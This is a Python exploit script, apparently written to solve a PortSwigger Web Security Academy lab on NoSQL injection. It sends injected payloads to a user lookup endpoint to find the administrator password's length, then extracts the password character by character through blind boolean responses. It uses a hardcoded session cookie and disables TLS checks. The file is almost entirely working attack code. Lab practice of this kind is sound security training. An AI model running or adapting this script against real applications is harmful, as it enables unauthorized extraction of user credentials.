# https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data

import urllib3
import urllib
import sys
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def no_sqli(url):
    password_extracted = ""

    i = 1

    # Find password length
    while True:
           
            # Construct NoSQL injection payload
            # Original payload: administrator' && this.password.length < 2 || 'a'=='b
            payload = "administrator' && this.password.length < %s || 'a'=='b" % (i)

            # URL-encode the payload
            payload_encoded = urllib.parse.quote(payload)

            # Set up cookies with the injected payload
            cookies = {'session': 'DmW2rqdJAScfeJDUD8Sx1kGbxSAKw6Fc'}

            urlPayload = url + "/user/lookup?user=" + payload_encoded

            # Send the HTTP request to the target URL with the payload
            r = requests.get(urlPayload, cookies=cookies, verify=False, proxies=proxies)

            # Make sure the username is not in the response body; if not, the length has not yet been found.
            if "username" not in r.text:
                sys.stdout.write('\rFinding password length: ' + str(i))
                sys.stdout.flush()
                i+=1
                continue
            else:
                password_length = i - 1
                # If the correct length is found, try to find the password
                print("\nPassword length found: " + str(password_length))

                print("\nStart finding password...")

                for j in range(password_length):

                    # Loop through ASCII values of printable characters (40 to 126) - https://theasciicode.com.ar/
                    # From 97 to 122 to get only lowercase characters
                    for k in range(97, 122):

                        secondPayload = "administrator' && this.password[%s] == '%s' || 'a'=='b" % (j, chr(k))
                        secondPayload_encoded = urllib.parse.quote(secondPayload)

                        urlSecondPayload = url + "/user/lookup?user=" + secondPayload_encoded

                        r = requests.get(urlSecondPayload, cookies=cookies, verify=False, proxies=proxies)

                        if "username" not in r.text:
                            sys.stdout.write('\rPassword Extracting: ' + password_extracted + chr(k))
                            sys.stdout.flush()
                        else:
                            password_extracted += chr(k)
                            sys.stdout.write('\rPassword Extracting: ' + password_extracted)
                            sys.stdout.flush()
                            break  # Move on to the next character in the password

                print("\n-----------------------------")
                print("Password found: " + password_extracted)
                print("-----------------------------")
                break

def main():
    if len(sys.argv) != 2:
        print("Usage: %s <URL>" % sys.argv[0])
        print("Example: %s https://victim.com" % sys.argv[0])

    url = sys.argv[1]
    no_sqli(url)

if __name__ == "__main__":
    main()
